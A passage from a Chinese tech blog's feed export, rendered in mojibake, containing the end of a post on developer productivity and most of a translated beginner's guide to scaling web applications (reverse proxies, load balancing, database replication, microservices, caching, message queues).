åˆ†æç»Ÿè®¡</li></ul><p>ç»éªŒå‘Šè¯‰æˆ‘ä»¬ï¼šé”™è¯¯è¶Šæ—©å¼•å…¥è½¯ä»¶å½“ä¸­ï¼Œé—®é¢˜å°±ä¼šè¶Šå¤æ‚ï¼Œä¿®æ­£è¿™ä¸ªé”™è¯¯çš„ä»£ä»·ä¹Ÿå°±è¶Šé«˜ï¼Œå› ä¸ºé”™è¯¯ä¼šç‰µæ¶‰åˆ°ç³»ç»Ÿçš„æ›´å¤šéƒ¨åˆ†ã€‚å› æ­¤ï¼Œä¿éšœå¼€å‘è´¨é‡å¹¶ä¸ä¼šè®©ä½ åšå¾ˆå¤šå·¥ä½œï¼Œè€Œä¼šè®©ä½ èŠ‚çœå¾ˆå¤šæ—¶é—´ã€‚é‚£äº›ä¸ºäº†è¿½æ±‚é€Ÿåº¦è€Œæ”¾å¼ƒè´¨é‡çš„å†³ç­–è€…æ˜¯æ„šè ¢çš„ã€‚æé«˜è´¨é‡ä¸ä»…èƒ½ç¼©çŸ­å¼€å‘å‘¨æœŸã€é™ä½å¼€å‘æˆæœ¬ï¼Œä¹Ÿè®©å·¥ä½œä¸ç”Ÿæ´»çš„å¹³è¡¡æˆä¸ºå¯èƒ½ã€‚</p><h1 id="è¿œç¦»è€å¥½äººé¢†å¯¼"><a href="#è¿œç¦»è€å¥½äººé¢†å¯¼" class="headerlink" title="è¿œç¦»è€å¥½äººé¢†å¯¼"></a>è¿œç¦»è€å¥½äººé¢†å¯¼</h1><p>è¿™æ ·çš„é¢†å¯¼å¤§åŒ…å¤§æ½ä¸€å¤§å †ï¼Œä¸æ¸…æ¥šèŒè´£è¾¹ç•Œã€‚çœ‹ä¼¼åšäº†å¾ˆå¤šå·¥ä½œï¼Œä½†åˆæœ‰å¾ˆå¤šé—®é¢˜ã€‚è¿™ä¸ä¼šç»™ä½ å¢åŠ æˆå°±æ„Ÿï¼Œåè€Œå¾’å¢æŒ«è´¥æ„Ÿï¼šæ¯å¤©çš„é—®é¢˜å¦‚æ´ªæ°´çŒ›å…½åå™¬ç€æ¯ä¸ªäººçš„æ—¶é—´ï¼Œä½ å’Œä»–åé¦ˆç°çŠ¶ï¼Œä»–åªä¼šè®©ä½ æ”¾å¼ƒä½ çš„æƒ³æ³•ï¼›ä½ å’Œä»–è®¨è®ºé—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œä»–çš„æ–¹æ¡ˆæ˜¯æƒå®œä¹‹è®¡ã€‚è¯·è¿œç¦»è¿™æ ·çš„é¢†å¯¼ï¼Œä»–åªä¼šä¸åœåå™¬ä½ å®è´µçš„æ—¶é—´ã€‚</p><hr><p>é‚£äº›ç»å¸¸å“­è¯‰è‡ªå·±æ¯å¤©ä»æ—©å¹²åˆ°æ™šçš„äººä¸å€¼å¾—åŒæƒ…ï¼ŒæŠ±æ€¨è§£å†³ä¸äº†ä»»ä½•é—®é¢˜ï¼Œåªä¼šæµªè´¹æ›´å¤šçš„æ—¶é—´ã€‚</p><p>æœ€åï¼Œæˆ‘æƒ³å¼•ç”¨ä¸€æ®µçŸ¥ä¹ç”¨æˆ·åœ¨ç›¸ä¼¼é—®é¢˜ä¸‹çš„<a href="https://www.zhihu.com/question/342244497/answer/815161940" target="_blank" rel="noopener">å›ç­”</a>ï¼š</p><blockquote><p>ä¸ºä»€ä¹ˆå‡ åå¹´å‰ï¼Œå¾ˆå¤šæ€æƒ³å®¶éƒ½å¹»æƒ³è¿‡ã€‚<br>éšç€ç§‘æŠ€å‘å±•ï¼Œäººä»¬æ¯å¤©åªéœ€è¦å·¥ä½œ3-5å°æ—¶ã€‚<br>äººä»¬å¯ä»¥äº«å—ç”Ÿæ´»ï¼Œäº«å—è‡ªç”±ï¼Œäº«å—å®¶åº­ï¼Œäº«å—å¤§è‡ªç„¶ã€‚</p><p>ä¸ºä»€ä¹ˆç§‘æŠ€è¶Šå‘å±•ï¼Œäººä»¬è¶Šæ²¡æ³•äº«å—ç§‘æŠ€å‘å±•çš„çº¢åˆ©ï¼Ÿ<br>äººä»¬ä¸ä»…æ²¡æ³•æ¯å¤©å·¥ä½œ3-5å°æ—¶ï¼Œ996è¿˜æˆäº†ç¦æŠ¥ï¼Œ35å²è¢«è£å‘˜æˆäº†æ ‡é…ã€‚<br>ä¸ºä»€ä¹ˆç§‘æŠ€è¶Šå‘å±•ï¼ŒåŠ³åŠ¨è€…è¶Šç—›è‹¦ï¼ŒåŠ³åŠ¨æ—¶é—´è¶Šé•¿ã€‚<br>ä¸ºä»€ä¹ˆç°åœ¨çš„ç»å¤§éƒ¨åˆ†åŠ³åŠ¨è€…ï¼Œéƒ½å…»ä¸æ´»ä¸¤ä¸ªå­©å­ï¼Ÿ</p><p>ç§‘æŠ€çœŸçš„è¿›æ­¥äº†å—ï¼Ÿç¤¾ä¼šçœŸçš„å‘å±•äº†å—ï¼Ÿ<br>å¦‚æœç§‘æŠ€è¿›æ­¥äº†ï¼Œç¤¾ä¼šå‘å±•äº†ï¼Œæ–‡åŒ–ç¹è£äº†ã€‚<br>é‚£ä¹ˆæ˜¯ä»€ä¹ˆå¤ºèµ°äº†äººä»¬çš„ç”Ÿæ´»ï¼Œæ—¶é—´ï¼Œå­©å­ï¼Ÿ</p></blockquote><hr><p>ç›¸å…³é˜…è¯»<br><a href="https://anaxi.com/blog/2018/10/15/top-12-things-that-destroy-developer-productivity/" target="_blank" rel="noopener">Top 12 Things That Destroy Developer Productivity</a></p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ï¼Œéšç¬”æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•ˆç‡ </tag>
            
            <tag> æ—¶é—´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è¯‘ã€‘é€šä¿—è®²è§£ç½‘ç«™æ‰©å±•</title>
      <link href="/post/website-extension/"/>
      <url>/post/website-extension/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g1drnb6tzij30jg0bf0tz.jpg" alt=""></p><a id="more"></a><h1 id="ã€è¯‘ã€‘é€šä¿—è®²è§£ç½‘ç«™æ‰©å±•"><a href="#ã€è¯‘ã€‘é€šä¿—è®²è§£ç½‘ç«™æ‰©å±•" class="headerlink" title="ã€è¯‘ã€‘é€šä¿—è®²è§£ç½‘ç«™æ‰©å±•"></a>ã€è¯‘ã€‘é€šä¿—è®²è§£ç½‘ç«™æ‰©å±•</h1><blockquote><p><em>è¯‘è€…æ³¨ï¼šæœ¬æ–‡è¯‘è‡ª Arcentry æ–‡ç« ã€ŠScaling webapps for newbs &amp; non-techiesã€‹ï¼Œç‚¹å‡»<a href="https://arcentry.com/blog/scaling-webapps-for-newbs-and-non-techies/" target="_blank" rel="noopener">æ­¤å¤„</a>æŸ¥çœ‹åŸæ–‡</em></p></blockquote><p>æœ¬æ–‡ç®€è¦çš„ä»‹ç»äº†ç½‘ç«™å¦‚ä½•ä»ä¸€å°æœåŠ¡å™¨åˆ°æ‰¿å—æ•°ç™¾ä¸‡ç”¨æˆ·çš„æ¶æ„éƒ¨ç½²æ¼”åŒ–ï¼Œä¸»è¦ä¸ºæ–°å…¥é—¨å¼€å‘è€…å’Œéä»ä¸šäººå‘˜è€Œå†™ã€‚</p><h2 id="ç½‘ç«™æ‰©å±•"><a href="#ç½‘ç«™æ‰©å±•" class="headerlink" title="ç½‘ç«™æ‰©å±•"></a>ç½‘ç«™æ‰©å±•</h2><p>ç°åœ¨ï¼Œå‡è®¾ä½ åˆšåˆšå®Œæˆäº†ä½ çš„ç½‘ç«™ï¼Œåœ¨çº¿å•†åº—ã€ç¤¾äº¤ APP æˆ–è€…åˆ«çš„ä»€ä¹ˆï¼Œå½“é¡¹ç›®ä¸Šçº¿æ—¶ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½å¥½æäº†ï¼šæ¯å¤©æœ‰å‡ ç™¾ä¸ªç”¨æˆ·è®¿é—®ä½ çš„ç½‘ç«™ï¼Œç½‘ç«™å¿«é€Ÿåšå‡ºè¯·æ±‚å“åº”ï¼Œä¸€åˆ‡éƒ½åœ¨æœ‰æ¡ä¸ç´Šåœ°è¿›è¡Œç€ã€‚</p><p>ä½†æ˜¯ä¹‹åä¸€ä»¶å¯æ€•çš„äº‹æƒ…å‡ºç°äº†ï¼šä½ çš„ç½‘ç«™ä¸€å¤œçˆ†çº¢ï¼</p><p>è¶Šæ¥è¶Šå¤šçš„ç”¨æˆ·å¼€å§‹æ¶Œå‘ä½ çš„ç½‘ç«™ï¼Œæ¯å°æ—¶ã€æ¯åˆ†é’Ÿã€æ¯ç§’é’Ÿæˆåƒä¸Šä¸‡çš„ç”¨æˆ·å‘æ¥è¯·æ±‚â€¦â€¦è¿™å¯¹è€æ¿æ¥è¯´ï¼ŒçœŸæ˜¯ä¸€ä¸ªå¤©å¤§çš„å¥½æ¶ˆæ¯ï¼Œä½†å¯¹åŸºç¡€è¿ç»´æ¥è¯´ï¼Œç®€ç›´å°±æ˜¯ä¸€åœºå™©æ¢¦ï¼Œå› ä¸ºç°åœ¨ï¼Œä½ éœ€è¦åšç½‘ç«™çš„æ‰©å±•æ¥æ‰¿å—æ´ªæ°´èˆ¬çš„æµé‡ã€‚è¿™æ„å‘³ç€ä½ éœ€è¦ï¼š</p><ul><li>åŒæ—¶å¤„ç†æ›´å¤šçš„è¯·æ±‚</li><li>é™¤äº†å…‰çº¤è¢«æŒ–æ–­ï¼ŒæœåŠ¡çš„é«˜å¯ç”¨</li><li>æœåŠ¡æ¥è‡ªä¸–ç•Œå„åœ°çš„ç”¨æˆ·</li></ul><h2 id="å¦‚ä½•æ‰©å±•"><a href="#å¦‚ä½•æ‰©å±•" class="headerlink" title="å¦‚ä½•æ‰©å±•"></a>å¦‚ä½•æ‰©å±•</h2><p>å‡ å¹´å‰ï¼Œè¿™æ ·çš„é—®é¢˜ä¼šä»æ°´å¹³æ‰©å±•ä¸å‚ç›´æ‰©å±•çš„è§’åº¦å¼€å§‹è®¨è®ºã€‚å‚ç›´æ‰©å±•æ˜¯æŒ‡é€šè¿‡æå‡å•æœºçš„å¤„ç†èƒ½åŠ›æ¥å¤„ç†æ›´å¤šçš„è¯·æ±‚ï¼Œè€Œæ°´å¹³æ‰©å±•åˆ™æ˜¯é€šè¿‡å¤åˆ¶å½“å‰æ¶æ„æ¨¡å‹æ¥æå‡å¤„ç†èƒ½åŠ›ã€‚</p><p>ä»Šå¤©ï¼Œå‡ ä¹æ²¡æœ‰äººå†ä½¿ç”¨å‚ç›´æ‰©å±•ï¼ŒåŸå› å¾ˆç®€å•ï¼š</p><ul><li>è®¡ç®—æœºçš„ä»·æ ¼è¶Šæ¥è¶Šæ˜‚è´µï¼Œè€Œæ€§èƒ½æå‡å´å¾®ä¹å…¶å¾®</li><li>å•å°æœåŠ¡å™¨çš„æ€§èƒ½å­˜åœ¨å¤©èŠ±æ¿</li><li>å¤šæ ¸CPUä¹Ÿå°±æ˜¯å¤šä¸ªå•æ ¸CPUçš„å¹¶è¡Œå¤„ç†æ•ˆç‡ï¼Œé‚£ä¸ºä»€ä¹ˆä¸è¿›è¡Œæ°´å¹³æ‰©å±•å‘¢ï¼Ÿ<br>OKï¼Œæˆ‘ä»¬é€‰ç”¨æ°´å¹³æ‰©å±•æ¥æå‡ç½‘ç«™ï¼Œä½†åˆéœ€è¦æ€ä¹ˆåšå‘¢ï¼Ÿ</li></ul><h3 id="1-å•ä¸€æœåŠ¡å™¨"><a href="#1-å•ä¸€æœåŠ¡å™¨" class="headerlink" title="1. å•ä¸€æœåŠ¡å™¨"></a>1. å•ä¸€æœåŠ¡å™¨</h3><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1dnqtex5gj30jg0bumxv.jpg" alt=""></p><p>è¿™å¯èƒ½æ˜¯ä½ æœ€åˆçš„æ¶æ„ã€‚ä¸€å°æœåŠ¡å™¨æ—¢è¿è¡Œç€ä¸šåŠ¡ï¼Œåˆå­˜å‚¨ç€æ•°æ®ï¼Œç®€å•åˆå®ç”¨ï¼Œä½†ä¸ºäº†æ»¡è¶³æ›´é«˜çš„è¦æ±‚ï¼Œè¿™ç§æ¶æ„åªèƒ½è¿è¡Œåœ¨æ€§èƒ½æ›´å¼ºçš„æœåŠ¡å™¨ä¸Šï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æ‰€å¸Œæœ›çš„ã€‚</p><h3 id="2-å¢åŠ åå‘ä»£ç†"><a href="#2-å¢åŠ åå‘ä»£ç†" class="headerlink" title="2. å¢åŠ åå‘ä»£ç†"></a>2. å¢åŠ åå‘ä»£ç†</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1dnxk7if8j30jg0alwf6.jpg" alt=""></p><p>ä¸ºäº†åº”ä»˜å¤§æµé‡ï¼Œä½ ç¬¬ä¸€æ­¥éœ€è¦åšçš„æ˜¯å¢åŠ åå‘ä»£ç†ã€‚å°±åƒæ˜¯é…’åº—çš„å‰å°ï¼Œä½ å¯ä»¥è®©å®¢äººç›´æ¥åˆ°ä»–çš„å®¢æˆ¿ï¼Œä½†äº‹å®ä¸Šï¼Œä½ éœ€è¦ä¸€ä½å¤§å ‚ç»ç†ï¼Œåˆ¤æ–­å®¢äººæ˜¯å¦å¯ä»¥è¿›å…¥ï¼Œæ˜¯å¦å·²ç»æå‰é¢„å®šå¥½å®¢æˆ¿ï¼Œå¦‚æœå®¢æˆ¿å·²æ»¡ï¼Œä½ åº”è¯¥å‹å¥½åœ°å‘ŠçŸ¥å®¢äººï¼Œè€Œä¸æ˜¯è®©å®¢äººè‡ªå·±æŒ¨ä¸ªå»æŸ¥çœ‹ã€‚è¿™ä¸ªä¾‹å­å¾ˆå¥½çš„è§£é‡Šäº†åå‘ä»£ç†ï¼Œåå‘ä»£ç†é€šå¸¸åªæ˜¯æ¥æ”¶ä¸è½¬å‘è¯·æ±‚ï¼Œç„¶åè¿™äº›è¯·æ±‚åœ¨å¤„ç†å®Œæˆåä»æˆ‘ä»¬çš„æœåŠ¡å™¨è¿”å›ç»™ç”¨æˆ·ã€‚å½“ç”¨æˆ·å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œè¿™äº›è¯·æ±‚éœ€è¦è·¯ç”±åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œåå‘ä»£ç†â€ã€‚</p><p>åå‘ä»£ç†çš„ä½œç”¨å¦‚ä¸‹ï¼š</p><ul><li>å¯ç”¨æ€§æ£€æŸ¥ã€‚ç¡®ä¿æˆ‘ä»¬çš„æœåŠ¡æ­£å¸¸è¿è¡Œ</li><li>è·¯ç”±ã€‚è½¬å‘è¯·æ±‚åˆ°æ­£ç¡®çš„å¤„ç†ç»ˆç«¯</li><li>é‰´æƒã€‚ç¡®ä¿ç”¨æˆ·æœ‰æƒé™è®¿é—®æœåŠ¡</li><li>é˜²ç«å¢™ã€‚ç¡®ä¿ä»…è¢«æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®</li></ul><h3 id="3-è´Ÿè½½å‡è¡¡"><a href="#3-è´Ÿè½½å‡è¡¡" class="headerlink" title="3. è´Ÿè½½å‡è¡¡"></a>3. è´Ÿè½½å‡è¡¡</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1doii7p2zj30jg0csgmn.jpg" alt=""></p><p>å¤§å¤šæ•°çš„åå‘ä»£ç†æœåŠ¡å™¨è¿˜æœ‰ä¸€ä¸ªä½œç”¨ï¼šè´Ÿè½½å‡è¡¡ã€‚è´Ÿè½½å‡è¡¡æ˜¯ä¸€ä¸ªè¾ƒä¸ºç®€å•çš„æ¦‚å¿µï¼šæƒ³è±¡ä¸€ä¸‹ï¼Œæœ‰100ä¸ªç”¨æˆ·å‡†å¤‡åœ¨é™å®šçš„æ—¶é—´å†…è¿›è¡Œæ”¯ä»˜ï¼Œä¸å¹¸çš„æ˜¯ï¼Œä½ çš„æ”¯ä»˜æœåŠ¡åªèƒ½åŒæ—¶å¤„ç†50ç¬”äº¤æ˜“ï¼Œè¯¥æ€ä¹ˆè§£å†³å‘¢ï¼Ÿä½ åªéœ€è¦åŒæ—¶è¿è¡Œä¸¤å°æ”¯ä»˜æœåŠ¡å°±å¯ä»¥äº†ã€‚</p><p>è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ç°åœ¨éœ€è¦å°†æ”¯ä»˜è¯·æ±‚åˆ†æµåˆ°ä¸¤å°æœåŠ¡å™¨ä¸Šï¼Œç”¨æˆ·Açš„æ”¯ä»˜åœ¨S1ä¸Šå¤„ç†ï¼Œç”¨æˆ·Bçš„æ”¯ä»˜åœ¨S2ä¸Šå¤„ç†ï¼Œç”¨æˆ·Cçš„æ”¯ä»˜åœ¨S3ä¸Šå¤„ç†â€¦â€¦</p><p>å¦‚æœåŒæ—¶æœ‰500ä¸ªç”¨æˆ·å‘èµ·æ”¯ä»˜è¯·æ±‚è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæ²¡é”™ï¼ä½ åªéœ€å°†æ”¯ä»˜æœåŠ¡å™¨æ‰©å±•åˆ°10å°æ¥åˆ†å‘å¤„ç†è¿™äº›è¯·æ±‚å³å¯ã€‚</p><h3 id="4-å¢å¼ºæ•°æ®åº“"><a href="#4-å¢å¼ºæ•°æ®åº“" class="headerlink" title="4. å¢å¼ºæ•°æ®åº“"></a>4. å¢å¼ºæ•°æ®åº“</h3><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g1doshmdyij30jg0bwwfh.jpg" alt=""></p><p>è´Ÿè½½å‡è¡¡å¯ä»¥å°†ç”¨æˆ·çš„è¯·æ±‚åœ¨å¤šå°æœåŠ¡å™¨è¿›è¡Œå¤„ç†ï¼Œä½†ä½ æ³¨æ„åˆ°å…¶ä¸­çš„é—®é¢˜äº†å—ï¼Ÿæˆ‘ä»¬å¯ä»¥æ‰©å±•å‡ åå°ã€å‡ ç™¾å°ç”šè‡³å‡ åƒå°æœåŠ¡å™¨æ¥å¤„ç†è¯·æ±‚ï¼Œä½†æ‰€æœ‰çš„æ•°æ®éƒ½å‚¨å­˜åœ¨äº†åŒä¸€ä¸ªæ•°æ®åº“ä¸­ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åŒæ ·çš„åŠæ³•æ¥æ‰©å±•æ•°æ®åº“å—ï¼Ÿç­”æ¡ˆæ˜¯ Noï¼è¿™é‡Œæ¶‰åŠåˆ°äº†æ•°æ®ä¸€è‡´æ€§çš„é—®é¢˜ã€‚æˆ‘ä»¬éœ€è¦ä¿è¯ç³»ç»Ÿæ‰€ä½¿ç”¨çš„æ•°æ®æ˜¯ä¸€è‡´çš„ï¼Œä¸ä¸€è‡´çš„æ•°æ®ä¼šå¯¼è‡´ä¸€ç³»åˆ—çš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼šåŒä¸€ä¸ªè®¢å•è¢«å¤šæ¬¡å¤„ç†ï¼Œæˆ‘ä»¬ä»ä¸€ä¸ª100å…ƒçš„è´¦æˆ·è¿›è¡Œäº†ä¸¤æ¬¡æ‰£æ¬¾æ“ä½œâ€¦â€¦é‚£æˆ‘ä»¬åˆè¯¥å¦‚ä½•è°ƒæ•´æ•°æ®åº“æ¥ç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§å‘¢ï¼Ÿ</p><p>é¦–å…ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†æ•°æ®åº“åŠŸèƒ½æ‹†åˆ†ï¼Œä¸€éƒ¨åˆ†åªè´Ÿè´£æ¥æ”¶ä¸å­˜å‚¨æ•°æ®ï¼Œå…¶ä»–éƒ¨åˆ†åªè¿›è¡Œæ•°æ®çš„æ£€ç´¢ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆè¢«ç§°ä¸ºä¸»ä»å¤åˆ¶æˆ–è€…è¯»å†™åˆ†ç¦»ã€‚å‡è®¾æ•°æ®è¢«è¯»å–çš„é¢‘ç‡é«˜äºå†™å…¥é¢‘ç‡ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ•°æ®ä¸€å¤„å†™å…¥ï¼Œå¤šå¤„è¯»å–ï¼ˆè¢«è¯»å–çš„æ•°æ®æ˜¯å†™å…¥æ•°æ®çš„å‰¯æœ¬ï¼‰ã€‚è¿™é‡Œçš„ç¼ºç‚¹æ˜¯æˆ‘ä»¬åªèƒ½åœ¨ä¸€å¤„å†™å…¥æ•°æ®ï¼Œè¿™å¯¹äºä¸­å°å‹ç½‘ç«™æ¥è¯´æ²¡æœ‰é—®é¢˜ï¼Œä½†ä¸é€‚ç”¨ Facebook è¿™æ ·çš„ç½‘ç«™ï¼Œæˆ‘ä»¬å°†åœ¨ç¬¬9ç« è¿›ä¸€æ­¥è®¨è®ºå¦‚ä½•æ‰©å±•è¿™æ ·çº§åˆ«çš„æ•°æ®åº“ã€‚</p><h3 id="5-å¾®æœåŠ¡"><a href="#5-å¾®æœåŠ¡" class="headerlink" title="5. å¾®æœåŠ¡"></a>5. å¾®æœåŠ¡</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1dpdetz6uj30jg0c3wfw.jpg" alt="Microservices"></p><p>åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç”¨ä¸€å°æœåŠ¡å™¨æ¥å¤„ç†æ‰€æœ‰çš„äº‹æƒ…ï¼šå¤„ç†æ”¯ä»˜ã€è®¢å•ã€åº“å­˜æŸ¥è¯¢ã€ç½‘ç«™è¿è¡Œã€ç®¡ç†è´¦æˆ·ç­‰ã€‚</p><p>è¿™æˆ–è®¸ä¸æ˜¯ä»¶åäº‹â€”â€”å•ä¸€æœåŠ¡å™¨æ„å‘³ç€æ›´ä½çš„å¤æ‚åº¦ã€ä¹Ÿæ›´åˆ©äºå¼€å‘äººå‘˜ã€‚ä½†éšç€æœåŠ¡å™¨çš„æ‰©å±•ï¼Œäº‹æƒ…å¼€å§‹å˜å¾—å¤æ‚ä¸ä½æ•ˆï¼š</p><ul><li>ä¸åŒæœåŠ¡å™¨å¤„ç†ç›¸åŒçš„äº‹æƒ…â€”â€”å¯¹æ¯ä¸ªç™»é™†çš„ç”¨æˆ·è€Œè¨€ï¼Œå¯èƒ½æœ‰å‡ ç™¾ä¸ªé¡µé¢éœ€è¦å¤„ç†ï¼Œä½†è¿™äº›éƒ½æ˜¯ç”±åŒä¸€ä¸ªæœåŠ¡å™¨å®Œæˆçš„ã€‚</li><li>å¼€å‘å›¢é˜Ÿéšç€ä¸šåŠ¡æ‰©å¼ â€”â€”éšç€è¶Šæ¥è¶Šå¤šçš„å¼€å‘è€…åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šå·¥ä½œï¼Œå†²çªä¹Ÿè¶Šæ¥è¶Šå¤š</li><li>å•ä¸€æœåŠ¡å™¨æ„å‘³ç€å½“æˆ‘ä»¬æƒ³è¦å®Œæˆæ–°ç‰ˆæœ¬çš„è¿­ä»£æ—¶ï¼Œå¿…é¡»å®Œæˆæ‰€æœ‰çš„å·¥ä½œã€‚å½“ä¸€ä¸ªå›¢é˜Ÿæƒ³è¦å¿«é€Ÿå‘å¸ƒæ›´æ–°æ—¶ï¼Œç”±äºä¾èµ–çš„å¦ä¸€ä¸ªå›¢é˜Ÿåªå®Œæˆäº†ä¸€åŠï¼Œå¯¼è‡´äº†å±é™©çš„ç›¸äº’ä¾èµ–æ€§ã€‚</li></ul><p>å¾®æœåŠ¡çš„å‡ºç°å¾ˆå¥½çš„è§£å†³äº†è¿™äº›é—®é¢˜ã€‚å¾®æœåŠ¡çš„æ¦‚å¿µå¾ˆç®€å•â€”â€”å°†ä½ çš„æœåŠ¡ä»¥åŠŸèƒ½å•å…ƒè¿›è¡Œæ‹†åˆ†ï¼Œå¹¶è¿›è¡Œç‹¬ç«‹éƒ¨ç½²ã€‚å¾®æœåŠ¡å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li>æ¯ä¸ªæœåŠ¡èƒ½éƒ½è¢«ç‹¬ç«‹æ‰©å±•ï¼Œè®©æˆ‘ä»¬èƒ½æ›´åŠ çµæ´»åœ°è°ƒæ•´ä»¥é€‚åº”ä¸šåŠ¡å‘å±•ï¼ˆ<em>è¯‘è€…æ³¨ï¼šæ¯”å¦‚é‚€è¯·æ³¨å†Œçš„ç½‘ç«™é™æ—¶å¼€æ”¾æ³¨å†Œï¼Œæ­¤æ—¶æœ‰å¤§é‡çš„æ³¨å†Œè¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥æ‰©å±•æ³¨å†Œè´¦æˆ·æœåŠ¡å™¨çš„å¤„ç†èƒ½åŠ›ï¼›å½“åŒåä¸€è¿›è¡Œå¤§é‡æ”¯ä»˜å¤„ç†æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‰©å±•æ”¯ä»˜ç³»ç»Ÿçš„å¤„ç†èƒ½åŠ›ï¼Œæ´»åŠ¨ç»“æŸåï¼Œå†å°†å¤„ç†èƒ½åŠ›è¿›è¡Œæ¢å¤ï¼Œæ­¤ä¸ºå¼¹æ€§æ‰©å®¹</em>ï¼‰</li><li>è¿ç»´å›¢é˜Ÿèƒ½å¤Ÿç‹¬ç«‹å¤„ç†å„åŠŸèƒ½å•å…ƒï¼Œä»–ä»¬èƒ½è´Ÿè´£å¾®æœåŠ¡çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸï¼ˆåˆ›å»ºã€éƒ¨ç½²ã€å‡çº§ç­‰ï¼‰</li><li>æ¯ä¸ªå¾®æœåŠ¡å¯ä»¥ä½¿ç”¨æ‰€éœ€èµ„æºã€‚å¦‚ç¬¬4ç« é‚£æ ·ï¼Œéœ€è¦æ•°æ®åº“çš„æ‰©å±•</li></ul><h3 id="6-ç¼“å­˜ä¸CDN"><a href="#6-ç¼“å­˜ä¸CDN" class="headerlink" title="6. ç¼“å­˜ä¸CDN"></a>6. ç¼“å­˜ä¸CDN</h3><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1dq9od5rcj30jg0c8abp.jpg" alt=""></p><p>æœ‰ä»€ä¹ˆæ¯”å·¥ä½œæ›´é«˜æ•ˆçš„æ–¹æ³•å—ï¼Ÿï¼ˆWhatâ€™s better than working more efficiently?ï¼‰ç­”æ¡ˆæ˜¯ä»€ä¹ˆéƒ½ä¸åšï¼æˆ‘ä»¬æ‰€ä½¿ç”¨çš„ç½‘ç«™æˆ–APPç”±å¤§é‡çš„é™æ€èµ„æºæ‰€ç»„æˆï¼Œå¦‚å›¾ç‰‡ã€JavaScript å’Œ CSS æ–‡ä»¶ï¼ŒæŸäº›äº§å“çš„é¢„æ¸²æŸ“ç™»é™†é¡µç­‰ã€‚ç›¸å¯¹äºåœ¨æ¯æ¬¡è¯·æ±‚æ—¶é‡æ–°è®¡ç®—æˆ–è€…é‡æ–°ç”Ÿæˆè¿™äº›èµ„æºï¼Œæˆ‘ä»¬ä½¿ç”¨â€œç¼“å­˜â€æ¥åŠ é€Ÿå“åº”å¹¶èŠ‚çº¦æœåŠ¡å™¨èµ„æºâ€”â€”ç¼“å­˜è®°å½•æœ€æ–°çš„ç»“æœï¼Œå¹¶ç›´æ¥è¿”å›ç»™å†æ¬¡è¯·æ±‚çš„ç”¨æˆ·ã€‚</p><p>å¤§å‹çš„ç¼“å­˜æœåŠ¡è¢«ç§°ä¸ºCDNï¼ˆContent Delivery Networkï¼Œå†…å®¹åˆ†å‘ç½‘ç»œï¼‰â€”â€”å¤§é‡çš„ç¼“å­˜å†…å®¹è¢«å­˜æ”¾åœ¨ä¸–ç•Œå„åœ°ã€‚CDNèƒ½è®©ç”¨æˆ·å°±è¿‘å¿«é€Ÿè·å–åˆ°æ‰€éœ€èµ„æºï¼Œè€Œä¸éœ€è¦æ¯æ¬¡è·¨è¶Šåƒå±±ä¸‡æ°´åˆ°ä¸­å¤®æœåŠ¡å™¨è·å–ã€‚</p><h3 id="7-æ¶ˆæ¯é˜Ÿåˆ—"><a href="#7-æ¶ˆæ¯é˜Ÿåˆ—" class="headerlink" title="7. æ¶ˆæ¯é˜Ÿåˆ—"></a>7. æ¶ˆæ¯é˜Ÿåˆ—</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1dqm3ll8uj30jg0bdjsz.jpg" alt="Message Queues"></p><p>ä½ å»è¿‡æ¸¸ä¹åœºå—ï¼Ÿæ˜¯ä¸æ˜¯ç»å¸¸éœ€è¦æ’é˜Ÿè´­ç¥¨å‘¢ï¼Ÿåœ°é“é—¸æœºå£ã€é“¶è¡ŒæŸœå°ã€æ¸¸ä¹åœºå”®ç¥¨å¤„éƒ½æ˜¯è§£é‡Šâ€œå­å®¹é‡å¹¶è¡Œæ€§â€ï¼ˆsub-capacity parallelismï¼‰æ¦‚å¿µéå¸¸å¥½çš„ä¾‹å­ã€‚æ²¡é”™ï¼Œä»–ä»¬éƒ½æ˜¯å¹¶è¡Œå¤„ç†çš„ï¼šå¤šä¸ªå”®ç¥¨çª—å£åŒæ—¶å”®ç¥¨ï¼Œä½†ä»–ä»¬åˆæ— æ³•åŒæ—¶ä¸ºæ¯ä¸ªäººæœåŠ¡ï¼Œå› æ­¤ï¼Œåœ¨æ¯ä¸ªçª—å£åå¼€äº†æ’é˜Ÿã€‚</p><p>åŒæ 